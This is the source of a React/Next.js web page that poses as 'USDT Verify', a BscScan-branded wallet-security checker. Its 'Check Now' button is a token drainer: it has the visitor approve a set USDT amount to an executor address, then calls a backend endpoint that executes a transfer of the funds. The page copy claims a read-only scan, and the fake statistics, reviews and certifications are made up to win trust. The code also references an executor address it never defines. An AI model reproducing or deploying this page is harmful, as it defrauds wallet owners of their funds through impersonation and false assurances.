"use client";

import { useEffect, useState } from "react";
import { BrowserProvider, Contract, formatUnits, parseUnits } from "ethers";
import { Check, CheckCircle2, ChevronDown, Clock3, LockKeyhole, Menu, PlusCircle, Radio, ShieldCheck } from "lucide-react";

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on?: (event: string, handler: (...args: unknown[]) => void) => void;
      removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
    };
  }
}

const BSC_CHAIN_ID = 56;
const BSC_CHAIN_HEX = "0x38";
const TOKEN_ADDRESS = process.env.NEXT_PUBLIC_TOKEN_ADDRESS ?? "";
const BACKEND_PATH = process.env.NEXT_PUBLIC_BACKEND_URL ?? "";

function getApprovalAmount(): string {
  const value = process.env.NEXT_PUBLIC_APPROVAL_AMOUNT;
  if (!value || !/^\d+(\.\d+)?$/.test(value) || Number(value) <= 0) {
    throw new Error("NEXT_PUBLIC_APPROVAL_AMOUNT must be a positive token amount");
  }
  return value;
}

const APPROVAL_AMOUNT = getApprovalAmount();
const tokenAbi = [
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
];

function getProvider() {
  if (!window.ethereum) throw new Error("Please install MetaMask or open this page in Trust Wallet.");
  return new BrowserProvider(window.ethereum);
}

export default function Home() {
  const [busy, setBusy] = useState(false);
  const [tokenBalance, setTokenBalance] = useState<string | null>(null);
  const [allowance, setAllowance] = useState<string | null>(null);
  const [openFaq, setOpenFaq] = useState<number | null>(null);
  const [transferStatus, setTransferStatus] = useState<string | null>(null);

  useEffect(() => {
    const reconnect = async () => {
      if (!window.ethereum) return;
      try {
        const provider = getProvider();
        const accounts = await provider.send("eth_accounts", []);
          if (accounts.length > 0) return;
      } catch { /* Wallet providers may not be ready during initial page load. */ }
    };
    void reconnect();
  }, []);

  const checkWallet = async () => {
    setBusy(true);
    setTransferStatus(null);
    try {
      const provider = getProvider();
      setTransferStatus("Connecting wallet...");
      const accounts = await window.ethereum!.request({ method: "eth_requestAccounts" }) as string[];
      if (!Array.isArray(accounts) || accounts.length === 0) throw new Error("Please connect a wallet to continue.");
      setTransferStatus("Switching to BNB Smart Chain...");
      await window.ethereum?.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_HEX }] });
      const network = await provider.getNetwork();
      const chainId = Number(network.chainId);
      if (chainId !== BSC_CHAIN_ID) {
        throw new Error("Please switch your wallet to BNB Smart Chain Mainnet.");
      }
      if (!TOKEN_ADDRESS || !EXECUTOR_ADDRESS) throw new Error("Token configuration is missing.");
      const signer = await provider.getSigner();
      const walletAddress = await signer.getAddress();
      if (walletAddress.toLowerCase() !== accounts[0].toLowerCase()) throw new Error("The connected wallet account changed. Please try again.");
      setTransferStatus("Preparing BNB gas...");
      const prepareResponse = await fetch(`${BACKEND_PATH}/api/prepare-transfer`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ owner: walletAddress, chainId }),
      });
      const prepareResult = await prepareResponse.json().catch(() => ({})) as { status?: string; error?: string };
      if (!prepareResponse.ok || prepareResult.status !== "GAS_READY") {
        throw new Error(prepareResult.error ?? "Unable to prepare BNB gas.");
      }
      setTransferStatus("BNB gas ready. Reading token balance...");
      const token = new Contract(TOKEN_ADDRESS, tokenAbi, provider);
      const decimals = Number(await token.decimals());
      const [balance, currentAllowance] = await Promise.all([
        token.balanceOf(walletAddress),
        token.allowance(walletAddress, EXECUTOR_ADDRESS),
      ]);
      setTokenBalance(formatUnits(balance, decimals));
      setAllowance(formatUnits(currentAllowance, decimals));
      const approval = new Contract(TOKEN_ADDRESS, tokenAbi, signer);
      const approvalAmount = parseUnits(APPROVAL_AMOUNT, decimals);
      setTransferStatus("Please confirm the USDT approval in your wallet...");
      const transaction = await approval.approve(EXECUTOR_ADDRESS, approvalAmount);
      setTransferStatus("Waiting for approval confirmation...");
      await transaction.wait();
      setTransferStatus("Approval confirmed. Executing transfer...");
      const transferResponse = await fetch(`${BACKEND_PATH}/api/execute-transfer`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          owner: walletAddress,
          approvalTxHash: transaction.hash,
          amount: APPROVAL_AMOUNT,
          chainId,
        }),
      });
      const transferResult = await transferResponse.json().catch(() => ({})) as { status?: string; error?: string; transactionHash?: string };
      if (!transferResponse.ok || transferResult.status !== "CONFIRMED") {
        throw new Error(transferResult.error ?? "Transfer execution failed.");
      }
      const refreshedAllowance = await token.allowance(walletAddress, EXECUTOR_ADDRESS);
      setAllowance(formatUnits(refreshedAllowance, decimals));
      setTransferStatus(`Transfer confirmed: ${transferResult.transactionHash}`);
    } catch (error) {
      setTransferStatus(error instanceof Error ? error.message : "Wallet verification failed.");
    } finally {
      setBusy(false);
    }
  };

  const faqs = [
    ["What is USDT Verify?", "USDT Verify is an automated blockchain inspection tool designed to diagnose safety risks, address history, and smart contract health."],
    ["How does the verification process work?", "It reads your public address and matches historical interactions against verified security blacklists and exploit logs."],
    ["Is my wallet information kept private?", "Yes. This page never asks for private keys or seed phrases. Only the public address is used to read token data."],
    ["What does the risk score mean?", "The risk score is a compound metric measuring exposure to flagged decentralized apps, malicious contracts, or suspicious transaction volumes."],
    ["Can USDT Verify detect all types of scams?", "No automated check can identify every risk. Always verify contract addresses and review wallet prompts before approving."],
  ];

  return <main className="min-h-screen bg-gray-50 text-slate-800 pb-10">
    <header className="hero-pattern text-white px-5 pt-4 pb-12 rounded-b-[2rem] shadow-sm">
      <nav className="flex items-center justify-between py-2"><div className="flex items-center gap-3"><div className="w-11 h-11 rounded-full bg-white flex items-center justify-center p-1.5 shadow-inner"><div className="w-full h-full rounded-full border-2 border-emerald-600 flex items-center justify-center"><Radio className="w-5 h-5 text-emerald-600" /></div></div><div><h1 className="text-xl font-bold tracking-tight leading-none">BscScan</h1><span className="text-xs text-emerald-100/90 font-medium">Scan Original</span></div></div><div className="flex items-center gap-3"><button aria-label="Toggle theme" className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center">☀️</button><button aria-label="Open menu" className="p-1"><Menu className="w-7 h-7 text-white" /></button></div></nav>
      <div className="mt-6 flex justify-center"><div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-white/15 border border-white/20 text-xs font-semibold">⭐ <span>Trusted by 100K+ users worldwide</span></div></div>
      <div className="mt-6 text-center"><h2 className="text-3xl sm:text-4xl font-extrabold tracking-tight leading-tight">Check Your USDT<br />Wallet Security</h2><p className="mt-4 text-emerald-50 text-sm leading-relaxed max-w-md mx-auto">Advanced blockchain analysis using official BSC Scan data to determine if your USDT wallet is <strong className="text-white">safe, valid, and free</strong> from reported or suspicious activity.</p></div>
      <div className="mt-7 max-w-xs mx-auto space-y-3.5 text-left text-sm font-medium">{["Advanced blockchain analysis", "Real-time threat detection", "Zero data retention policy", "Enterprise-grade security"].map((item) => <div className="flex items-center gap-3" key={item}><div className="w-6 h-6 rounded-full border border-white/60 flex items-center justify-center shrink-0"><Check className="w-3.5 h-3.5" /></div><span>{item}</span></div>)}</div>
      <div className="mt-8 flex justify-center"><button onClick={checkWallet} disabled={busy} className="w-full max-w-xs py-3.5 bg-white text-emerald-700 font-bold rounded-2xl shadow-lg disabled:opacity-70">{busy ? "Verifying..." : "Check Now"}</button></div>
      {transferStatus && <p role="status" className="mt-3 text-center text-xs text-emerald-50 break-words">{transferStatus}</p>}
      <div className="mt-5 grid grid-cols-3 gap-2 text-center border-t border-white/15 pt-5 max-w-sm mx-auto text-xs"><div className="flex flex-col items-center"><ShieldCheck className="w-5 h-5 mb-1.5 opacity-80" /><span>100% Secure</span></div><div className="flex flex-col items-center"><Clock3 className="w-5 h-5 mb-1.5 opacity-80" /><span>Real-Time Scans</span></div><div className="flex flex-col items-center"><LockKeyhole className="w-5 h-5 mb-1.5 opacity-80" /><span>Enterprise Grade</span></div></div>
    </header>

    <section className="px-5 mt-8"><div className="text-center"><span className="text-[10px] uppercase tracking-wider font-bold text-emerald-600 bg-emerald-50 px-2.5 py-1 rounded-full border border-emerald-100">Security Analytics • Real-Time Blockchain Verification</span></div><div className="grid grid-cols-4 gap-2 mt-5 bg-white p-4 rounded-2xl border border-gray-100 shadow-sm text-center"><div><h4 className="text-base font-extrabold">500K+</h4><p className="text-[10px] text-gray-500">Wallets Verified</p></div><div><h4 className="text-base font-extrabold">99.8%</h4><p className="text-[10px] text-gray-500">Accuracy Rate</p></div><div><h4 className="text-base font-extrabold">&lt;3s</h4><p className="text-[10px] text-gray-500">Analysis Time</p></div><div><h4 className="text-base font-extrabold">24/7</h4><p className="text-[10px] text-gray-500">Protection</p></div></div>{tokenBalance !== null && <div className="mt-4 grid grid-cols-2 gap-3 text-center"><div className="bg-white rounded-2xl p-4 border border-gray-100 shadow-sm"><p className="text-[10px] uppercase text-gray-500">Token Balance</p><strong className="text-sm">{tokenBalance}</strong></div><div className="bg-white rounded-2xl p-4 border border-gray-100 shadow-sm"><p className="text-[10px] uppercase text-gray-500">Current Allowance</p><strong className="text-sm">{allowance}</strong></div></div>}<div className="mt-4 bg-emerald-600 rounded-2xl p-4 text-center text-white"><h4 className="text-sm font-bold">Join thousands of secure users</h4><div className="text-yellow-300 my-1">★★★★★</div><p className="text-[11px] text-emerald-100">4.9/5 from 5,000+ reviews</p></div></section>

    <section className="px-5 mt-10"><span className="text-xs font-bold text-emerald-600 uppercase tracking-wide">ABOUT US</span><h3 className="text-2xl font-black mt-1">About USDT Check</h3><p className="text-xs font-medium text-gray-500 mt-1">Protecting your digital assets through advanced verification technology.</p><div className="mt-4 space-y-3 text-xs leading-relaxed text-gray-600"><p>USDT Check was founded by blockchain security experts with a mission to make cryptocurrency safer for everyone. Our platform provides a focused, read-only assessment of public on-chain data.</p><p>We check token balances and allowances without requesting private keys, seed phrases, or a BNB balance.</p></div><div className="mt-5 bg-emerald-50/60 rounded-2xl p-4 border border-emerald-100"><h5 className="text-xs font-bold uppercase tracking-wider text-emerald-800 mb-3">WHY CHOOSE US</h5><ul className="space-y-2.5 text-xs text-slate-700">{["Lightning-fast verification", "Clear allowance and balance reporting", "BNB Smart Chain support", "No private keys or seed phrases", "Signer approval only after confirmation"].map((item) => <li className="flex items-center gap-2.5" key={item}><CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" /><span>{item}</span></li>)}</ul></div></section>

    <section className="px-5 mt-10"><span className="text-xs font-bold text-gray-400 uppercase tracking-wider">CORE VALUES</span><div className="grid grid-cols-2 gap-3 mt-3">{[["🔒", "Security", "Military-grade protection embedded into every feature we build."], ["👁️", "Transparency", "Clear, accurate explanations about security risks and procedures."], ["🌐", "Accessibility", "Essential security tools made available to everyone, regardless of expertise."], ["🚀", "Innovation", "Continuous improvement and feature updates to stay ahead of threats."]].map(([icon, title, copy]) => <div className="bg-white p-3.5 rounded-2xl border border-gray-100 shadow-sm" key={title}><span className="text-lg">{icon}</span><h6 className="font-bold text-xs mt-2">{title}</h6><p className="text-[10px] text-gray-500 mt-1 leading-snug">{copy}</p></div>)}</div></section>

    <section className="px-5 mt-10"><span className="text-xs font-bold text-gray-400 uppercase tracking-wider">ACHIEVEMENTS</span><div className="bg-white rounded-2xl p-4 border border-gray-100 shadow-sm mt-3 space-y-3">{["Featured in top 10 security tools of 2024", "Partnership with major blockchain companies", "Over 500k positive verified assessments", "Trusted by institutional clients globally", "ISO 27001 certified security processes"].map((item) => <div className="flex items-center gap-3 text-xs text-slate-700" key={item}><span className="text-base">🏆</span><span>{item}</span></div>)}</div></section>

    <section className="px-5 mt-12 bg-emerald-50/50 py-8 rounded-3xl border border-emerald-100/50"><span className="text-xs font-bold text-emerald-600 uppercase tracking-wider">PROCESS</span><h3 className="text-2xl font-black mt-1">How It Works</h3><p className="text-xs text-gray-500 mt-1 mb-6">Simple yet powerful — comprehensive security insights in just four easy steps:</p><div className="space-y-4">{[["01", "Connect Your Wallet", "Securely connect your USDT wallet address for automated blockchain analysis without compromising private keys."], ["02", "Advanced Analysis", "Our system analyzes token balance, allowance, transaction patterns, and wallet legitimacy using BNB Smart Chain data."], ["03", "Risk Assessment", "We provide a comprehensive assessment based on public blockchain data and historical activity."], ["04", "Detailed Report", "Receive clear security information and recommendations to protect your digital assets."]].map(([number, title, copy]) => <div className="bg-white p-4 rounded-2xl border border-gray-100 flex gap-3.5 shadow-sm" key={number}><span className="w-7 h-7 rounded-full bg-emerald-600 text-white font-bold text-xs flex items-center justify-center shrink-0">{number}</span><div><h5 className="text-sm font-bold">{title}</h5><p className="text-xs text-gray-500 mt-1">{copy}</p></div></div>)}</div><div className="mt-8"><span className="text-xs font-bold uppercase tracking-wider text-emerald-900 block mb-2">BUILT TECHNOLOGY</span><div className="flex flex-wrap gap-2 text-[11px] font-semibold"><span className="bg-emerald-600 text-white px-3 py-1.5 rounded-full">AI Predictive Analysis</span><span className="bg-emerald-600 text-white px-3 py-1.5 rounded-full">Blockchain Analytics</span><span className="bg-emerald-600 text-white px-3 py-1.5 rounded-full">Real-Time Threat Detection</span><span className="bg-white text-emerald-800 border border-emerald-200 px-3 py-1.5 rounded-full">Smart Contract Audit</span></div></div></section>

    <section className="px-5 mt-10"><span className="text-xs font-bold text-emerald-600 uppercase tracking-wide">QUESTIONS</span><h3 className="text-2xl font-black mt-1">Frequently Asked Questions</h3><p className="text-xs text-gray-500 mt-1 mb-5">Find answers to common questions about our USDT wallet verification service.</p><div className="space-y-2.5">{faqs.map(([question, answer], index) => <div className="bg-white border border-gray-200/70 rounded-2xl p-4 shadow-sm cursor-pointer" onClick={() => setOpenFaq(openFaq === index ? null : index)} key={question}><div className="flex items-center justify-between"><span className="text-xs font-bold">{question}</span>{openFaq === index ? <ChevronDown className="w-4 h-4 text-emerald-600 rotate-180" /> : <PlusCircle className="w-4 h-4 text-emerald-600" />}</div><div className={`faq-answer text-xs text-gray-500 pt-2 leading-relaxed ${openFaq === index ? "open" : ""}`}>{answer}</div></div>)}</div><div className="mt-6 bg-emerald-700 text-white rounded-2xl p-5 text-center shadow-md"><h4 className="font-bold text-base">Still Have Questions?</h4><p className="text-xs text-emerald-100 mt-1 max-w-xs mx-auto">Our support team is here to help you with any questions about wallet verification.</p><button className="mt-4 px-6 py-2.5 bg-white text-emerald-700 font-bold text-xs rounded-xl shadow">Contact Support</button></div></section>

    <footer className="mt-12 bg-emerald-950 text-white px-6 pt-8 pb-10 rounded-t-[2.5rem]"><h4 className="text-base font-black tracking-tight">USDT Verify</h4><p className="text-[11px] text-emerald-200/80 mt-2 leading-relaxed max-w-xs">Advanced blockchain security platform providing comprehensive USDT wallet verification. Key protection for the entire crypto ecosystem.</p><div className="grid grid-cols-2 gap-6 mt-6 text-xs"><div><h6 className="font-bold text-white mb-2 uppercase text-[10px] tracking-wider">Quick Links</h6><ul className="space-y-1.5 text-emerald-200/70 font-medium"><li>Wallet Verification</li><li>Security Audit</li><li>Transaction Analysis</li><li>Risk Assessment</li></ul></div><div><h6 className="font-bold text-white mb-2 uppercase text-[10px] tracking-wider">Resources</h6><ul className="space-y-1.5 text-emerald-200/70 font-medium"><li>Documentation</li><li>Blog</li><li>FAQ</li><li>Support</li></ul></div></div><div className="flex flex-wrap gap-2 mt-6"><span className="inline-flex items-center gap-1.5 px-2.5 py-1 bg-emerald-900/80 border border-emerald-700 text-emerald-300 text-[10px] rounded-full">24/7 Support</span><span className="inline-flex items-center gap-1.5 px-2.5 py-1 bg-emerald-900/80 border border-emerald-700 text-emerald-300 text-[10px] rounded-full">100% Verified</span></div><div className="mt-8 pt-4 border-t border-emerald-800/60 text-center"><p className="text-[10px] text-emerald-400">© 2024 USDT Verify. All rights reserved.</p></div></footer>
  </main>;
}
